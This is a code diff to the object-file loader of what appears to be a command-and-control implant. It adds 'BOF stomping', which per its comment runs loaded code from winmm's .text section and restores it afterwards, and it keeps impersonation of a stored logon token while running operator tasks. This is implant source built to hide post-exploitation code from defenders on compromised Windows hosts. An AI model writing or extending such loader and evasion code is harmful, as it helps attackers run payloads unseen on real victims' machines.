@@ -39,6 +39,11 @@ BOOL Boffer::Initialize()
         return FALSE;
     
     ApiWin->InitializeCriticalSection(&this->managerLock);
+
+    if (isBofStompEnabled()) {
+        if (!InitBofStomp(getBofStompDll(), getBofStompMethod())) {
+        }
+    }
     return TRUE;
 }
 
@@ -102,44 +107,43 @@ AsyncBofContext* Boffer::CreateAsyncBof(ULONG taskId, CHAR* entryName, BYTE* cof
 DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
 {
     AsyncBofContext* ctx = (AsyncBofContext*)lpParameter;
-    if (!ctx)
-        return 1;
-    
+    if (!ctx) return 1;
+
     tls_CurrentBofContext = ctx;
-    
+
     if (g_StoredToken)
         ApiWin->ImpersonateLoggedOnUser(g_StoredToken);
-    
+
     ctx->state = ASYNC_BOF_STATE_RUNNING;
-    
-    COF_HEADER* pHeader = (COF_HEADER*)ctx->coffFile;
+
+    COF_HEADER* pHeader      = (COF_HEADER*)ctx->coffFile;
     COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(ctx->coffFile + pHeader->PointerToSymbolTable);
-    
-    BOOL result = AllocateSections(ctx->coffFile, pHeader, ctx->mapSections);
+
+    /* AllocateSections now returns mapFunctions alongside sections */
+    BOOL result = AllocateSections(ctx->coffFile, pHeader, ctx->mapSections, &ctx->mapFunctions);
     if (!result) {
         ctx->state = ASYNC_BOF_STATE_FINISHED;
         tls_CurrentBofContext = NULL;
         return 1;
     }
-    
-    ctx->mapFunctions = (LPVOID*)ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+
     if (!ctx->mapFunctions) {
-        CleanupSections(ctx->mapSections, MAX_SECTIONS);
+        CleanupSections(ctx->mapSections, MAX_SECTIONS, NULL);
         ctx->state = ASYNC_BOF_STATE_FINISHED;
         tls_CurrentBofContext = NULL;
         return 1;
     }
-    
-    result = ProcessRelocations(ctx->coffFile, pHeader, ctx->mapSections, pSymbolTable, ctx->mapFunctions);
+
+    result = ProcessRelocations(ctx->coffFile, pHeader, ctx->mapSections,
+                                pSymbolTable, (LPVOID*)ctx->mapFunctions);
     if (!result) {
-        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
+        CleanupSections(ctx->mapSections, MAX_SECTIONS, ctx->mapFunctions);
         ctx->mapFunctions = NULL;
-        CleanupSections(ctx->mapSections, MAX_SECTIONS);
         ctx->state = ASYNC_BOF_STATE_FINISHED;
         tls_CurrentBofContext = NULL;
         return 1;
     }
-    
+
     ApiWin->EnterCriticalSection(&ctx->outputLock);
     ctx->outputBuffer->Pack32(ctx->taskId);
     ctx->outputBuffer->Pack32(50);  // COMMAND_EXEC_BOF
@@ -147,18 +151,17 @@ DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
     ApiWin->LeaveCriticalSection(&ctx->outputLock);
 
     CHAR* entryFuncName = PrepareEntryName(ctx->entryName);
-    if (entryFuncName) { 
-        ExecuteProc(entryFuncName, ctx->args, ctx->argsSize, pSymbolTable, pHeader, ctx->mapSections);
+    if (entryFuncName) {
+        ExecuteProc(entryFuncName, ctx->args, ctx->argsSize,
+                    pSymbolTable, pHeader, ctx->mapSections);
         FreeFunctionName(entryFuncName);
     }
-    
-    if (ctx->mapFunctions) {
-        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
-        ctx->mapFunctions = NULL;
-    }
-    CleanupSections(ctx->mapSections, MAX_SECTIONS);
 
-    ApiWin->EnterCriticalSection(&ctx->outputLock); 
+    /* Cleanup — restores winmm .text and releases lock if stomping was used */
+    CleanupSections(ctx->mapSections, MAX_SECTIONS, ctx->mapFunctions);
+    ctx->mapFunctions = NULL;
+
+    ApiWin->EnterCriticalSection(&ctx->outputLock);
     ctx->outputBuffer->Pack32(ctx->taskId);
     ctx->outputBuffer->Pack32(50);  // COMMAND_EXEC_BOF
     ctx->outputBuffer->Pack8(FALSE);
@@ -166,10 +169,10 @@ DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
 
     ctx->state = ASYNC_BOF_STATE_FINISHED;
     tls_CurrentBofContext = NULL;
-    
+
     if (g_AsyncBofManager)
         g_AsyncBofManager->SignalWakeup();
-    
+
     return 0;
 }
 
@@ -310,11 +313,13 @@ void Boffer::CleanupBofContext(AsyncBofContext* ctx)
         ctx->hStopEvent = NULL;
     }
     
-    if (ctx->mapFunctions) {
-        ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
-        ctx->mapFunctions = NULL;
-    }
-    CleanupSections(ctx->mapSections, MAX_SECTIONS);
+    // if (ctx->mapFunctions) {
+    //     ApiWin->VirtualFree(ctx->mapFunctions, 0, MEM_RELEASE);
+    //     ctx->mapFunctions = NULL;
+    // }
+    // CleanupSections(ctx->mapSections, MAX_SECTIONS);
+    CleanupSections(ctx->mapSections, MAX_SECTIONS, ctx->mapFunctions);
+    ctx->mapFunctions = NULL;
     
     if (ctx->coffFile)
         MemFreeLocal((LPVOID*)&ctx->coffFile, ctx->coffFileSize);
